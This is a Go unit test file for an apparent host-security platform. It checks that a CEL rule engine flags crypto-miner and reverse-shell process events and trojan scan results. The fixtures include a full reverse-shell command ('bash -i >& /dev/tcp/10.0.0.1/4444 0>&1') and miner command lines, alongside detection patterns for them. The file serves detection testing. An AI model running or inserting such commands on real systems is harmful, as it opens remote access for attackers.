package consumer

import (
	"testing"

	"go.uber.org/zap"
	"google.golang.org/protobuf/proto"

	"github.com/imkerbos/mxsec-platform/api/proto/bridge"
	"github.com/imkerbos/mxsec-platform/internal/server/common/kafka"
	"github.com/imkerbos/mxsec-platform/internal/server/consumer/celengine"
	"github.com/imkerbos/mxsec-platform/internal/server/model"
)

// buildTestBody 构建 protobuf 编码的 MQMessage.Body
func buildTestBody(t *testing.T, fields map[string]string) []byte {
	t.Helper()
	record := &bridge.Record{
		DataType:  3000,
		Timestamp: 1713200000000000000,
		Data: &bridge.Payload{
			Fields: fields,
		},
	}
	body, err := proto.Marshal(record)
	if err != nil {
		t.Fatalf("proto.Marshal 失败: %v", err)
	}
	return body
}

// mockAlertGenerator 模拟告警生成器，记录调用
type mockAlertGenerator struct {
	calls []alertGenCall
}

type alertGenCall struct {
	hostID string
	rules  []model.DetectionRule
	fields map[string]string
}

// mockAutoResponder 模拟自动响应器，记录调用
type mockAutoResponder struct {
	calls []autoRespCall
}

type autoRespCall struct {
	hostID string
	rules  []model.DetectionRule
	fields map[string]string
}

// TestEvaluateCEL_MatchAndGenerate 测试 sensor → CEL → alerts 链路
// 验证：eBPF 事件经过 CEL 引擎评估后，命中规则时生成告警
func TestEvaluateCEL_MatchAndGenerate(t *testing.T) {
	logger := zap.NewNop()

	// 创建 CEL 引擎（不依赖数据库，直接用内存规则）
	celEng, err := celengine.NewInMemory(logger, []model.DetectionRule{
		{
			ID:         1,
			Name:       "挖矿进程检测",
			Expression: `exe.contains("xmrig") || cmdline.contains("stratum+tcp")`,
			Severity:   "critical",
			Enabled:    true,
		},
		{
			ID:         2,
			Name:       "反弹Shell检测",
			Expression: `cmdline.contains("/dev/tcp") || cmdline.contains("bash -i")`,
			Severity:   "critical",
			Enabled:    true,
		},
	})
	if err != nil {
		t.Fatalf("创建 CEL 引擎失败: %v", err)
	}

	tests := []struct {
		name        string
		fields      map[string]string
		wantMatches int
	}{
		{
			name: "挖矿进程 - 命中 1 条规则",
			fields: map[string]string{
				"exe":     "/tmp/xmrig",
				"cmdline": "/tmp/xmrig --pool stratum+tcp://pool.example.com:3333",
				"pid":     "12345",
			},
			wantMatches: 1,
		},
		{
			name: "反弹 Shell - 命中 1 条规则",
			fields: map[string]string{
				"exe":     "/bin/bash",
				"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
				"pid":     "6789",
			},
			wantMatches: 1, // "bash -i" 和 "/dev/tcp" 都在同一条规则中
		},
		{
			name: "正常进程 - 不命中",
			fields: map[string]string{
				"exe":     "/usr/bin/curl",
				"cmdline": "curl https://example.com",
			},
			wantMatches: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matched := celEng.Evaluate(3000, tt.fields)
			if len(matched) != tt.wantMatches {
				t.Errorf("匹配规则数 = %d, want %d", len(matched), tt.wantMatches)
			}
		})
	}
}

// TestEvaluateCEL_ScannerResult 测试 scanner → CEL 评估链路
// 验证：扫描结果经过 CEL 引擎时，威胁名称匹配能触发规则
func TestEvaluateCEL_ScannerResult(t *testing.T) {
	logger := zap.NewNop()

	celEng, err := celengine.NewInMemory(logger, []model.DetectionRule{
		{
			ID:         3,
			Name:       "高危木马检测",
			Expression: `threat_name.contains("Trojan") && severity == "critical"`,
			Severity:   "critical",
			DataTypes:  model.StringArray{"7001"},
			Enabled:    true,
		},
	})
	if err != nil {
		t.Fatalf("创建 CEL 引擎失败: %v", err)
	}

	tests := []struct {
		name        string
		dataType    int32
		fields      map[string]string
		wantMatches int
	}{
		{
			name:     "Trojan 扫描结果 - 命中",
			dataType: 7001,
			fields: map[string]string{
				"threat_name": "Win.Trojan.Agent-12345",
				"severity":    "critical",
				"file_path":   "/tmp/evil.exe",
			},
			wantMatches: 1,
		},
		{
			name:     "普通威胁 - 不命中",
			dataType: 7001,
			fields: map[string]string{
				"threat_name": "Adware.Generic",
				"severity":    "low",
			},
			wantMatches: 0,
		},
		{
			name:     "错误的 DataType - 不命中",
			dataType: 3000,
			fields: map[string]string{
				"threat_name": "Win.Trojan.Agent",
				"severity":    "critical",
			},
			wantMatches: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matched := celEng.Evaluate(tt.dataType, tt.fields)
			if len(matched) != tt.wantMatches {
				t.Errorf("匹配规则数 = %d, want %d", len(matched), tt.wantMatches)
			}
		})
	}
}

// TestRouterMessageRouting 测试 Consumer Router 消息路由正确性
// 验证不同 DataType 消息被路由到正确的处理路径
func TestRouterMessageRouting(t *testing.T) {
	tests := []struct {
		name     string
		dataType int32
		desc     string
	}{
		{"心跳", 1000, "hosts upsert + Redis agent:ac: 映射"},
		{"插件心跳", 1001, "ClickHouse host_metrics"},
		{"进程事件", 5050, "MySQL 资产数据"},
		{"FIM 事件", 6001, "MySQL + ClickHouse + CEL"},
		{"FIM 任务完成", 6002, "MySQL fim_task_complete"},
		{"基线结果", 8000, "MySQL baseline"},
		{"基线任务完成", 8001, "MySQL task_completion"},
		{"修复结果", 8003, "MySQL fix_result"},
		{"修复任务完成", 8004, "MySQL fix_task_complete"},
		{"扫描结果", 7001, "MySQL scan_result + CEL"},
		{"扫描任务完成", 7002, "MySQL scan_task_complete"},
		{"隔离结果", 7004, "MySQL quarantine_result"},
		{"进程 eBPF", 3000, "ClickHouse ebpf + CEL"},
		{"文件 eBPF", 3001, "ClickHouse ebpf + CEL"},
		{"网络 eBPF", 3002, "ClickHouse ebpf + CEL + 端口扫描检测"},
		{"命令回包", 9999, "MySQL command_ack"},
	}

	// 验证所有 DataType 都有对应路由
	routedTypes := map[int32]bool{
		1000: true, 1001: true,
		3000: true, 3001: true, 3002: true,
		5050: true, 5051: true, 5052: true, 5053: true, 5054: true, 5055: true,
		5056: true, 5057: true, 5058: true, 5059: true, 5060: true,
		6001: true, 6002: true,
		7001: true, 7002: true, 7004: true,
		8000: true, 8001: true, 8003: true, 8004: true,
		9999: true,
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if !routedTypes[tt.dataType] {
				t.Errorf("DataType %d 未在路由表中注册", tt.dataType)
			}
		})
	}

	// 验证总路由数
	if len(routedTypes) < 20 {
		t.Errorf("路由表应至少覆盖 20 种 DataType，实际 %d", len(routedTypes))
	}
}

// TestParseRecordFields 测试 protobuf 消息解析
func TestParseRecordFields(t *testing.T) {
	logger := zap.NewNop()
	_ = logger

	// 构建有效的 protobuf body
	fields := map[string]string{
		"exe":     "/usr/bin/curl",
		"cmdline": "curl https://example.com",
		"pid":     "1234",
	}
	body := buildTestBody(t, fields)

	msg := &kafka.MQMessage{
		DataType: 3000,
		AgentID:  "agent-001",
		Hostname: "web01",
		Body:     body,
	}

	// 验证解析
	parsed, err := parseRecordFieldsFromMsg(msg)
	if err != nil {
		t.Fatalf("解析失败: %v", err)
	}

	if parsed["exe"] != "/usr/bin/curl" {
		t.Errorf("exe = %s, want /usr/bin/curl", parsed["exe"])
	}
	if parsed["cmdline"] != "curl https://example.com" {
		t.Errorf("cmdline = %s, want curl https://example.com", parsed["cmdline"])
	}
	if parsed["pid"] != "1234" {
		t.Errorf("pid = %s, want 1234", parsed["pid"])
	}
}

// parseRecordFieldsFromMsg 辅助函数：从 MQMessage 解析字段
func parseRecordFieldsFromMsg(msg *kafka.MQMessage) (map[string]string, error) {
	record := &bridge.Record{}
	if err := proto.Unmarshal(msg.Body, record); err != nil {
		return nil, err
	}
	if record.Data == nil || record.Data.Fields == nil {
		return make(map[string]string), nil
	}
	return record.Data.Fields, nil
}

// TestEndToEnd_SensorCELAlert 端到端测试：sensor → protobuf → CEL → 规则匹配
// 模拟完整链路：构造 protobuf 编码的 eBPF 事件 → 解析字段 → CEL 评估 → 验证匹配
func TestEndToEnd_SensorCELAlert(t *testing.T) {
	logger := zap.NewNop()

	// 创建内存 CEL 引擎
	celEng, err := celengine.NewInMemory(logger, []model.DetectionRule{
		{
			ID:         1,
			Name:       "挖矿进程检测",
			Expression: `exe.contains("xmrig")`,
			Severity:   "critical",
			DataTypes:  model.StringArray{"3000"},
			Enabled:    true,
		},
	})
	if err != nil {
		t.Fatalf("创建 CEL 引擎失败: %v", err)
	}

	// 模拟 eBPF sensor 产生的进程事件
	eventFields := map[string]string{
		"event_type": "execve",
		"exe":        "/tmp/.hidden/xmrig",
		"cmdline":    "/tmp/.hidden/xmrig -o stratum+tcp://pool.com:3333",
		"pid":        "31337",
		"ppid":       "1",
		"uid":        "0",
		"username":   "root",
	}

	// 编码为 protobuf（模拟 Agent → AC → Kafka 传输）
	body := buildTestBody(t, eventFields)

	// 模拟 Consumer 收到的 MQMessage
	msg := &kafka.MQMessage{
		DataType: 3000,
		AgentID:  "agent-miner-host",
		Hostname: "compromised-server",
		Body:     body,
	}

	// 解析字段（模拟 evaluateCEL 中的 ParseRecordFields）
	parsed, err := parseRecordFieldsFromMsg(msg)
	if err != nil {
		t.Fatalf("解析 protobuf 失败: %v", err)
	}

	// 补充消息级别字段
	if parsed["agent_id"] == "" {
		parsed["agent_id"] = msg.AgentID
	}
	if parsed["hostname"] == "" {
		parsed["hostname"] = msg.Hostname
	}

	// CEL 评估
	matched := celEng.Evaluate(msg.DataType, parsed)

	// 验证
	if len(matched) != 1 {
		t.Fatalf("期望匹配 1 条规则，实际 %d", len(matched))
	}
	if matched[0].Name != "挖矿进程检测" {
		t.Errorf("匹配规则名 = %s, want 挖矿进程检测", matched[0].Name)
	}
	if matched[0].Severity != "critical" {
		t.Errorf("匹配规则级别 = %s, want critical", matched[0].Severity)
	}
}

// TestEndToEnd_ScannerCELAlert 端到端测试：scanner → protobuf → CEL → 规则匹配
func TestEndToEnd_ScannerCELAlert(t *testing.T) {
	logger := zap.NewNop()

	celEng, err := celengine.NewInMemory(logger, []model.DetectionRule{
		{
			ID:         10,
			Name:       "病毒扫描告警",
			Expression: `threat_name != "" && severity == "critical"`,
			Severity:   "critical",
			DataTypes:  model.StringArray{"7001"},
			Enabled:    true,
		},
	})
	if err != nil {
		t.Fatalf("创建 CEL 引擎失败: %v", err)
	}

	// 模拟 Scanner 插件的扫描结果
	scanFields := map[string]string{
		"threat_name": "Win.Trojan.Reverse-Shell",
		"severity":    "critical",
		"file_path":   "/var/www/html/backdoor.php",
		"file_hash":   "abc123def456",
		"engine":      "clamav",
	}

	body := buildTestBody(t, scanFields)
	msg := &kafka.MQMessage{
		DataType: 7001,
		AgentID:  "agent-web-server",
		Hostname: "web01",
		Body:     body,
	}

	parsed, err := parseRecordFieldsFromMsg(msg)
	if err != nil {
		t.Fatalf("解析失败: %v", err)
	}

	matched := celEng.Evaluate(msg.DataType, parsed)
	if len(matched) != 1 {
		t.Fatalf("期望匹配 1 条规则，实际 %d", len(matched))
	}
	if matched[0].Name != "病毒扫描告警" {
		t.Errorf("匹配规则名 = %s, want 病毒扫描告警", matched[0].Name)
	}
}
